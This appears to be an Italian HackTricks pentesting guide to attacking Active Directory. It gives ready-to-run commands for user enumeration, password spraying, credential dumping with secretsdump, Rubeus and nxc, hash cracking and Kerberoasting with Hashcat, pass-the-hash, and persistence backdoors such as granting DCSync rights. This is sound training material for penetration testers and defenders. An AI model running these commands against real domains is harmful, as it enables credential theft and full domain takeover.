# Metodologia di Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** funge da tecnologia fondamentale, permettendo agli **amministratori di rete** di creare e gestire in modo efficiente **domini**, **utenti** e **oggetti** all'interno di una rete. È progettata per scalare, facilitando l'organizzazione di un elevato numero di utenti in **gruppi** e **sottogruppi** gestibili, controllando i **diritti di accesso** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli principali: **domini**, **alberi** e **foreste**. Un **domain** comprende una raccolta di oggetti, come **utenti** o **dispositivi**, che condividono un database comune. I **trees** sono gruppi di questi domini collegati da una struttura condivisa, e una **forest** rappresenta la raccolta di più alberi, interconnessi tramite **trust relationships**, formando il livello più alto della struttura organizzativa. Diritti specifici di **accesso** e **comunicazione** possono essere assegnati a ciascuno di questi livelli.

Concetti chiave in **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Object** – Indica entità all'interno della directory, compresi **utenti**, **gruppi** o **cartelle condivise**.
3. **Domain** – Funziona come contenitore per gli oggetti della directory; più domini possono coesistere all'interno di una **forest**, ognuno mantenendo la propria raccolta di oggetti.
4. **Tree** – Raggruppamento di domini che condividono un dominio radice comune.
5. **Forest** – Il livello più alto della struttura organizzativa in Active Directory, composto da diversi tree con **trust relationships** tra loro.

**Active Directory Domain Services (AD DS)** comprende una serie di servizi critici per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi includono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **utenti** e **domini**, inclusi i processi di **authentication** e di **search**.
2. **Certificate Services** – Gestisce la creazione, distribuzione e amministrazione dei certificati digitali sicuri.
3. **Lightweight Directory Services** – Supporta applicazioni che usano la directory tramite il protocollo **LDAP**.
4. **Directory Federation Services** – Fornisce funzionalità di **single-sign-on** per autenticare utenti su più applicazioni web in una singola sessione.
5. **Rights Management** – Aiuta a proteggere il materiale soggetto a copyright regolando la sua distribuzione e uso non autorizzato.
6. **DNS Service** – Cruciale per la risoluzione dei **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Per imparare come **attaccare un AD** devi comprendere molto bene il processo di **Kerberos authentication**.  
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Puoi andare su [https://wadcoms.github.io/](https://wadcoms.github.io) per avere una visione rapida dei comandi che puoi eseguire per enumerare/sfruttare un AD.

> [!WARNING]
> La comunicazione Kerberos **richiede un nome completamente qualificato (FQDN)** per eseguire azioni. Se provi ad accedere a una macchina tramite indirizzo IP, **verrà usato NTLM e non Kerberos**.

## Recon Active Directory (No creds/sessions)

Se hai accesso solo a un ambiente AD ma non possiedi credenziali/sessioni, potresti:

- **Pentest the network:**
- Scannerizzare la rete, trovare macchine e porte aperte e provare a **exploit vulnerabilities** o **extract credentials** da esse (per esempio, [printers could be very interesting targets](ad-information-in-printers.md)).
- L'enumerazione del DNS può fornire informazioni sui server chiave nel dominio come web, printers, shares, vpn, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dai un'occhiata alla pagina Generale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) per trovare più informazioni su come fare questo.
- **Check for null and Guest access on smb services** (questo non funzionerà sulle versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guida più dettagliata su come enumerare un server SMB può essere trovata qui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guida più dettagliata su come enumerare LDAP può essere trovata qui (presta **particolare attenzione all'accesso anonimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Raccogliere credenziali impersonando servizi con Responder (vedi [../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md))
- Accedere a host sfruttando [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogliere credenziali **esponendo** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrarre username/nome da documenti interni, social media, servizi (principalmente web) all'interno degli ambienti di dominio e anche da quelli pubblicamente disponibili.
- Se trovi i nomi completi dei dipendenti, puoi provare diverse **AD username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3 lettere di ognuno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettere casuali e 3 numeri casuali_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumerazione utenti

- **Anonymous SMB/LDAP enum:** Consulta le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando viene richiesta una username non valida il server risponderà con il codice di errore Kerberos _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permettendoci di determinare che la username è invalida. Le **username valide** restituiranno o il **TGT in a AS-REP** oppure l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che l'utente deve eseguire la pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contro l'interfaccia MS-NRPC (Netlogon) sui domain controller. Il metodo chiama la funzione `DsrGetDcNameEx2` dopo aver effettuato il binding all'interfaccia MS-NRPC per verificare se l'utente o il computer esiste senza alcuna credenziale. Lo strumento [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumerazione. La ricerca può essere trovata [qui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se trovi uno di questi server nella rete puoi anche eseguire **user enumeration** contro di esso. Ad esempio, potresti usare lo strumento [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare liste di username in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) e in questo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere i **nomi delle persone che lavorano in azienda** derivanti dal passo di recon che avresti dovuto eseguire prima. Con nome e cognome potresti usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare potenziali username validi.

### Conoscere uno o più username

Ok, quindi sai di avere già uno username valido ma nessuna password... Prova:

- [**ASREPRoast**](asreproast.md): Se un utente **non ha** l'attributo _DONT_REQ_PREAUTH_ puoi **richiedere un messaggio AS_REP** per quell'utente che conterrà alcuni dati criptati tramite una derivazione della password dell'utente.
- [**Password Spraying**](password-spraying.md): Prova le password più **comuni** con ciascuno degli utenti scoperti; magari qualche utente usa una password debole (tieni presente la password policy!).
- Nota che puoi anche **sprayare i server OWA** per provare ad ottenere accesso alle mail degli utenti.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti essere in grado di **ottenere** alcuni challenge **hash** da craccare effettuando poisoning di alcuni protocolli della **rete**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se sei riuscito a enumerare l'active directory avrai **più email e una migliore comprensione della rete**. Potresti essere in grado di forzare attacchi NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) per ottenere accesso all'ambiente AD.

### Steal NTLM Creds

Se puoi **accedere ad altri PC o share** con l'**utente null o guest** potresti **posizionare file** (come un file SCF) che, se in qualche modo aperti, faranno scattare una **autenticazione NTLM verso di te** così da poter **rubare** la **challenge NTLM** per craccarla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tratta ogni NT hash che già possiedi come una password candidata per altri formati più lenti il cui materiale chiave è derivato direttamente dall'NT hash. Invece di brute-forzare passphrase lunghe in Kerberos RC4 tickets, NetNTLM challenges o cached credentials, inserisci gli NT hashes nelle modalità NT-candidate di Hashcat e lascia che validi il riuso della password senza mai conoscere il plaintext. Questo è particolarmente potente dopo un domain compromise dove puoi raccogliere migliaia di NT hashes correnti e storici.

Usa lo shucking quando:

- Hai un corpus NT ottenuto tramite DCSync, NTDS dumps, o vault di credenziali e devi testare il riuso in altri domini/foreste.
- Catturi materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM, o blob DCC/DCC2.
- Vuoi provare rapidamente il riuso per passphrase lunghe e non craccabili e pivotare immediatamente via Pass-the-Hash.

La tecnica **non funziona** contro tipi di cifratura i cui key material non sono l'NT hash (es., Kerberos etype 17/18 AES). Se un dominio impone solo AES, devi tornare alle modalità password regolari.

#### Building an NT hash corpus

- **DCSync/NTDS** – Usa `secretsdump.py` con history per ottenere il più grande set possibile di NT hashes (e i loro precedenti valori):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le entry di history ampliano dramaticamente il pool di candidati perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per altre modalità di harvesting di segreti NTDS vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) estrae dati locali SAM/SECURITY e cached domain logons (DCC/DCC2). Deduplica e aggiungi quegli hash allo stesso file `nt_candidates.txt`.
- **Track metadata** – Conserva username/domain che hanno prodotto ogni hash (anche se la wordlist contiene solo esadecimale). Gli hash corrispondenti ti dicono immediatamente quale principale sta riutilizzando una password una volta che Hashcat stampa il candidate vincente.
- Preferisci candidati dalla stessa forest o da una forest trusted; questo massimizza la probabilità di overlap quando shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Note:

- Gli input NT-candidate **devono rimanere raw 32-hex NT hashes**. Disabilita gli engine di regole (no `-r`, niente modalità ibride) perché il mangling corrompe il materiale chiave candidato.
- Queste modalità non sono intrinsecamente più veloci, ma lo spazio chiave NT (~30,000 MH/s su un M3 Max) è ~100× più veloce del Kerberos RC4 (~300 MH/s). Testare una lista NT curata è molto più economico che esplorare l'intero spazio password nel formato lento.
- Esegui sempre la **versione più recente di Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) perché le modalità 31500/31600/35300/35400 sono state aggiunte recentemente.
- Attualmente non esiste una modalità NT per AS-REQ Pre-Auth, e gli etype AES (19600/19700) richiedono la password in chiaro perché le loro chiavi sono derivate tramite PBKDF2 da password UTF-16LE, non da raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni NT candidate e valida il blob `$krb5tgs$23$...`. Una corrispondenza conferma che l'account di servizio usa uno degli NT hashes che hai già.

3. Pivot immediatamente via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Puoi opzionalmente recuperare il plaintext in seguito con `hashcat -m 1000 <matched_hash> wordlists/` se necessario.

#### Example – Cached credentials (mode 31600)

1. Dump dei cached logons da una workstation compromessa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la riga DCC2 per l'utente di dominio interessante in `dcc2_highpriv.txt` e shuckala:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una corrispondenza riuscita restituisce l'NT hash già noto nella tua lista, provando che l'utente cached sta riutilizzando una password. Usalo direttamente per PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o brute-forzalo in modalità NT veloce per recuperare la stringa.

Lo stesso workflow si applica a NetNTLM challenge-responses (`-m 27000/27100`) e DCC (`-m 31500`). Una volta identificata una corrispondenza puoi lanciare relay, PtH SMB/WMI/WinRM, o ri-crackare l'NT hash con mask/regole offline.



## Enumerating Active Directory WITH credentials/session

Per questa fase devi aver **compromesso le credenziali o una sessione di un account di dominio valido.** Se hai credenziali valide o una shell come utente di dominio, **ricorda che le opzioni indicate prima sono ancora valide per compromettere altri utenti.**

Prima di iniziare l'enumerazione autenticata dovresti conoscere il **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerazione

Aver compromesso un account è un **grande passo per iniziare a compromettere l'intero dominio**, perché potrai iniziare l'**Active Directory Enumeration:**

Per quanto riguarda [**ASREPRoast**](asreproast.md) puoi ora trovare ogni possibile utente vulnerabile, e per quanto riguarda [**Password Spraying**](password-spraying.md) puoi ottenere una **lista di tutti gli username** e provare la password dell'account compromesso, password vuote e nuove password promettenti.

- Potresti usare il [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Puoi anche usare [**powershell for recon**](../basic-powershell-for-pentesters/index.html) che sarà più stealthy
- Puoi anche [**use powerview**](../basic-powershell-for-pentesters/powerview.md) per estrarre informazioni più dettagliate
- Un altro strumento eccellente per il recon in Active Directory è [**BloodHound**](bloodhound.md). Non è **molto stealthy** (dipende dai metodi di collection che usi), ma **se non ti interessa** l'impronta, dovresti provarlo. Trova dove gli utenti possono RDP, percorsi verso altri gruppi, ecc.
- **Altri strumenti automatici per l'enumerazione AD sono:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) in quanto potrebbero contenere informazioni interessanti.
- Uno **strumento con GUI** che puoi usare per enumerare la directory è **AdExplorer.exe** della SysInternal Suite.
- Puoi anche cercare nel database LDAP con **ldapsearch** per cercare credenziali nei campi _userPassword_ & _unixUserPassword_, o anche in _Description_. cfr. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) per altri metodi.
- Se stai usando **Linux**, potresti anche enumerare il dominio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Potresti provare anche strumenti automatici come:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Estrazione di tutti gli utenti del dominio**

È molto facile ottenere tutti gli username del dominio da Windows (`net user /domain`, `Get-DomainUser` o `wmic useraccount get name,sid`). In Linux, puoi usare: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Anche se questa sezione di Enumeration sembra breve, questa è la parte più importante di tutte. Accedi ai link (principalmente quelli di cmd, powershell, powerview e BloodHound), impara come enumerare un dominio e pratica finché non ti senti a tuo agio. Durante un assessment, questo sarà il momento chiave per trovare la strada verso DA o per decidere che non si può fare nulla.

### Kerberoast

Kerberoasting consiste nell'ottenere **TGS tickets** usati da servizi legati ad account utente e craccare la loro cifratura — che è basata sulle password utente — **offline**.

Più informazioni in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una volta ottenute delle credenziali potresti verificare se hai accesso a qualche **macchina**. A tal fine, puoi usare **CrackMapExec** per tentare connessioni su diversi server con protocolli differenti, in base alle tue scansioni di porte.

### Local Privilege Escalation

Se hai compromesso credenziali o una sessione come utente di dominio normale e hai **accesso** con questo utente a **qualsiasi macchina nel dominio** dovresti provare a trovare il modo di **escalare i privilegi localmente e cercare credenziali**. Questo perché solo con permessi di amministratore locale potrai **dumpare gli hash di altri utenti** in memoria (LSASS) e localmente (SAM).

C'è una pagina completa in questo libro su [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e una [**checklist**](../checklist-windows-privilege-escalation.md). Inoltre, non dimenticare di usare [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

È molto **improbabile** che troverai **ticket** nell'utente corrente che ti diano permessi per accedere a risorse inattese, ma potresti controllare:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se sei riuscito a enumerare l'active directory avrai **più indirizzi email e una migliore comprensione della rete**. Potresti essere in grado di forzare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Cerca Creds nelle condivisioni dei computer | SMB Shares

Ora che hai alcune credenziali di base dovresti controllare se puoi **trovare** file **interessanti condivisi all'interno dell'AD**. Potresti farlo manualmente ma è un compito molto noioso e ripetitivo (soprattutto se trovi centinaia di documenti da controllare).

[**Segui questo link per scoprire gli strumenti che puoi usare.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Rubare NTLM Creds

Se puoi **accedere ad altri PCs o share** potresti **posizionare file** (come un file SCF) that if somehow accessed will t**rigger an NTLM authentication against you** così puoi **rubare** la **NTLM challenge** per crackarla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità ha permesso a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Per le tecniche seguenti un normale domain user non è sufficiente, hai bisogno di privilegi/credenziali speciali per eseguire questi attacchi.**

### Hash extraction

Si spera che tu sia riuscito a **compromettere qualche account local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluso relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Poi, è il momento di dumpare tutti gli hash in memoria e localmente.\
[**Leggi questa pagina sulle diverse modalità per ottenere gli hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una volta che hai l'hash di un utente**, puoi usarlo per **impersonarlo**.\
Devi usare qualche **tool** che **effettui** l'**autenticazione NTLM usando** quell'**hash**, **oppure** potresti creare un nuovo **sessionlogon** e **inject** quell'**hash** dentro **LSASS**, così quando viene eseguita qualsiasi **NTLM authentication**, quell'**hash sarà usato.** L'ultima opzione è quello che fa mimikatz.\
[**Leggi questa pagina per maggiori informazioni.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Questo attacco mira a **usare l'hash NTLM dell'utente per richiedere ticket Kerberos**, come alternativa al comune Pass The Hash over NTLM protocol. Di conseguenza, questo può essere particolarmente **utile in reti dove il protocollo NTLM è disabilitato** e solo **Kerberos è consentito** come protocollo di autenticazione.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Nella tecnica **Pass The Ticket (PTT)**, gli attaccanti **rubano il ticket di autenticazione di un utente** invece della sua password o dei suoi valori hash. Questo ticket rubato viene poi usato per **impersonare l'utente**, ottenendo accesso non autorizzato a risorse e servizi all'interno di una rete.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se hai l'**hash** o la **password** di un **local administrato**r dovresti provare a **login locally** su altri **PCs** con esso.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **rumoroso** e **LAPS** lo **mitigherebbe**.

### MSSQL Abuse & Trusted Links

Se un utente ha privilegi per **accedere a istanze MSSQL**, potrebbe essere in grado di usarle per **eseguire comandi** sull'host MSSQL (se in esecuzione come SA), **rubare** l'NetNTLM **hash** o perfino eseguire un **relay** **attack**.\
Inoltre, se un'istanza MSSQL è trusted (database link) da una diversa istanza MSSQL, se l'utente ha privilegi sul database trusted, potrà **usare la relazione di trust per eseguire query anche nell'altra istanza**. Questi trust possono essere concatenati e a un certo punto l'utente potrebbe trovare un database mal configurato dove può eseguire comandi.\
**I collegamenti tra database funzionano anche attraverso trust tra foreste.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suite di inventory e deployment di terze parti spesso espongono percorsi potenti verso credenziali ed esecuzione di codice. Vedi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi qualsiasi oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e hai privilegi di dominio sulla macchina, sarai in grado di dumpare TGTs dalla memoria di ogni utente che effettua il login sulla macchina.\
Quindi, se un **Domain Admin effettua il login sulla macchina**, potrai dumpare il suo TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Grazie alla constrained delegation potresti persino **compromettere automaticamente un Print Server** (sperando che sia un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se a un utente o computer è consentita la "Constrained Delegation" sarà in grado di **impersonare qualsiasi utente per accedere ad alcuni servizi su una macchina**.\
Poi, se **comprometti l'hash** di questo utente/computer sarai in grado di **impersonare qualsiasi utente** (anche domain admins) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avere il privilegio **WRITE** su un oggetto Active Directory di un computer remoto abilita l'ottenimento di esecuzione di codice con **privilegi elevati**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utente compromesso potrebbe avere alcuni **privilegi interessanti su oggetti di dominio** che potrebbero permetterti di **muoverti** lateralmente/**escalare** i privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Scoprire un **servizio Spool in ascolto** all'interno del dominio può essere **abusato** per **acquisire nuove credenziali** e **escalare privilegi**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **altri utenti** **accedono** alla macchina **compromessa**, è possibile **raccogliere credenziali dalla memoria** e perfino **iniettare beacon nei loro processi** per impersonarli.\
Di solito gli utenti accedono al sistema via RDP, quindi ecco come eseguire un paio di attacchi su sessioni RDP di terze parti:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornisce un sistema per gestire la **password dell'Administrator locale** sui computer joinati al dominio, garantendo che sia **randomizzata**, unica e frequentemente **cambiata**. Queste password sono memorizzate in Active Directory e l'accesso è controllato tramite ACL agli utenti autorizzati. Con permessi sufficienti per accedere a queste password, diventa possibile pivotare verso altri computer.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Raccogliere certificati** dalla macchina compromessa potrebbe essere un modo per escalare privilegi all'interno dell'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se sono configurati **template vulnerabili** è possibile abusarne per escalare privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una volta ottenuti privilegi di **Domain Admin** o ancora meglio **Enterprise Admin**, puoi **dumpare** il **database di dominio**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Alcune delle tecniche discusse prima possono essere usate per persistenza.\
Per esempio potresti:

- Rendere utenti vulnerabili a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendere utenti vulnerabili a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Concedere privilegi [**DCSync**](#dcsync) a un utente

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**Silver Ticket attack** crea un **legittimo TGS ticket** per un servizio specifico usando l'**NTLM hash** (per esempio, l'**hash dell'account macchina**). Questo metodo è impiegato per **accedere ai privilegi del servizio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** coinvolge l'attaccante che ottiene l'**NTLM hash dell'account krbtgt** in un ambiente Active Directory (AD). Questo account è speciale perché viene usato per firmare tutti i **Ticket Granting Tickets (TGTs)**, essenziali per l'autenticazione nella rete AD.

Una volta che l'attaccante ottiene questo hash, può creare **TGTs** per qualsiasi account scelga (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Questi sono come golden ticket forgiati in modo da **bypassare i comuni meccanismi di rilevamento dei golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Avere i certificati di un account o poterli richiedere** è un ottimo modo per persistere nell'account dell'utente (anche se lui cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usando certificati è anche possibile persistere con privilegi elevati all'interno del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'oggetto **AdminSDHolder** in Active Directory garantisce la sicurezza dei **gruppi privilegiati** (come Domain Admins e Enterprise Admins) applicando una standard **Access Control List (ACL)** su questi gruppi per prevenire modifiche non autorizzate. Tuttavia, questa funzionalità può essere sfruttata; se un attaccante modifica l'ACL di AdminSDHolder per dare pieno accesso a un utente normale, quell'utente ottiene ampio controllo su tutti i gruppi privilegiati. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi contro, permettendo accessi non autorizzati a meno che non sia strettamente monitorata.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

